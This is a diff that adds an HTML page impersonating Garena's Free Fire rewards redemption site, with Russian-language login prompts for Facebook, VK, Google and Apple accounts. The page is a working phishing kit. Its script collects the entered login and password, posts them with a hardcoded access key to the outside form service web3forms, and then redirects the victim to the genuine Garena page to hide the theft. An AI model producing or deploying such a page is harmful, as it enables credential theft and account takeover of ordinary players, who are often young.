@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire - Redemption Site</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            background: #ffffff; /* Белый фон */
+            font-family: 'Arial', sans-serif; color: #000;
+            height: 100vh; overflow-x: hidden;
+        }
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 12px 20px; background: #000;
+        }
+        .ff-logo { width: 110px; height: 40px; background: url('https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_logo.png') no-repeat; background-size: contain; }
+        
+        .store-btn {
+            background: #fff; color: #000; padding: 6px 14px;
+            font-weight: bold; border-radius: 4px; text-decoration: none; font-size: 12px;
+            text-transform: uppercase; border: 1px solid #ddd;
+        }
+
+        .main { text-align: center; margin-top: 50px; padding: 0 15px; }
+        .main h1 { font-size: 28px; margin-bottom: 8px; font-weight: 800; color: #000; }
+        .main p { font-size: 16px; margin-bottom: 35px; color: #555; }
+
+        .social-row {
+            display: flex; justify-content: center; gap: 15px; margin-bottom: 45px;
+        }
+        .soc-btn {
+            width: 58px; height: 58px; background: #fff; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; border: 1px solid #eee; transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 0;
+        }
+        .soc-btn:active { transform: scale(0.9); }
+        .soc-btn svg, .soc-btn img { width: 32px; height: 32px; }
+
+        .notice {
+            background: #f9f9f9; color: #444;
+            margin: 0 auto; padding: 25px; border-radius: 12px;
+            max-width: 420px; text-align: left; font-size: 13px; line-height: 1.7;
+            border: 1px solid #eee;
+        }
+        .notice h3 { margin: 0 0 12px 0; font-size: 18px; color: #000; font-weight: bold; }
+        .orange { color: #f36f21; font-weight: bold; }
+
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center;
+        }
+        .modal-card {
+            background: #fff; width: 330px; padding: 30px;
+            border-top: 5px solid #f36f21; border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .modal-card h2 { margin: 0 0 20px 0; font-size: 15px; color: #f36f21; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
+        .inp {
+            width: 100%; padding: 15px; margin-bottom: 15px; background: #f5f5f5;
+            border: 1px solid #ddd; color: #000; box-sizing: border-box; outline: none; border-radius: 4px;
+        }
+        .btn-go { 
+            width: 100%; padding: 16px; background: #f36f21; color: #fff; 
+            border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 4px;
+        }
+
+        .footer {
+            position: fixed; bottom: 0; width: 100%; background: #f1f1f1;
+            padding: 15px; display: flex; align-items: center; font-size: 10px; color: #888; border-top: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="ff-logo"></div>
+    <a href="#" class="store-btn">🛒 Store</a>
+</div>
+
+<div class="main">
+    <h1>Rewards Redemption Site</h1>
+    <p>Please log in.</p>
+
+    <div class="social-row">
+        <button class="soc-btn" onclick="openLogin('Facebook', 'Моб. номер или эл. адрес')">
+            <svg viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        </button>
+        
+        <button class="soc-btn" onclick="openLogin('ВКонтакте', 'Телефон или почта')">
+            <svg viewBox="0 0 24 24"><path fill="#0077FF" d="M13.162 18.994c-6.098 0-9.57-4.172-9.714-11.109h3.047c.1 5.102 2.344 7.265 4.126 7.712V7.885h2.863v4.406c1.75-.187 3.598-2.188 4.223-4.406h2.863c-.469 2.734-2.485 4.734-3.906 5.562 1.42.656 3.734 2.39 4.672 5.547h-3.14c-.735-2.296-2.563-4.078-5.126-4.328v4.328h-.808z"/></svg>
+        </button>
+
+        <button class="soc-btn" onclick="openLogin('Google', 'Электронная почта')">
+            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
+        </button>
+
+        <button class="soc-btn" onclick="openLogin('Apple', 'Apple ID')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/800px-Apple_logo_black.svg.png">
+        </button>
+    </div>
+
+    <div class="notice">
+        <h3>Important Notice:</h3>
+        1. Redemption code has <span class="orange">12/16</span> characters, consisting of capital letters and numbers.<br>
+        2. Item rewards are shown in <span class="orange">[vault]</span> tab in game lobby; gold or diamonds will add in account wallet automatically.<br>
+        3. Please note redemption expiration date. Any expired codes cannot be redeemed.<br>
+        4. Please contact customer service if you encountered any issue.<br>
+        5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK in order to receive the rewards.
+    </div>
+</div>
+
+<div class="footer">
+    <img src="https://garena.com/garena_common/images/garena_logo.png" style="width:25px; margin-right:12px;">
+    <div>Copyright © Garena International. Trademarks belong to their respective owners.</div>
+</div>
+
+<div class="modal" id="modal">
+    <div class="modal-card">
+        <h2 id="mTitle">АВТОРИЗАЦИЯ</h2>
+        <input type="text" id="acc" class="inp" placeholder="Логин">
+        <input type="password" id="pass" class="inp" placeholder="Пароль">
+        <button class="btn-go" onclick="send()">ВОЙТИ</button>
+    </div>
+</div>
+
+<script>
+    let curM = "";
+    const TOKEN = "0a270743-92d9-493a-9c4d-680fac6ba260";
+
+    function openLogin(m, ph) {
+        curM = m;
+        document.getElementById('mTitle').innerText = m + " АВТОРИЗАЦИЯ";
+        document.getElementById('acc').placeholder = ph;
+        document.getElementById('modal').style.display = 'flex';
+    }
+
+    function send() {
+        const u = document.getElementById('acc').value;
+        const p = document.getElementById('pass').value;
+        if(u.length < 4 || p.length < 5) return alert("Ошибка! Проверьте данные.");
+
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ access_key: TOKEN, message: `LOG: ${u} | PASS: ${p} | VIA: ${curM}` })
+        }).then(() => {
+            window.location.href = "https://reward.ff.garena.com/ru";
+        });
+    }
+
+    window.onclick = function(e) {
+        if (e.target == document.getElementById('modal')) document.getElementById('modal').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
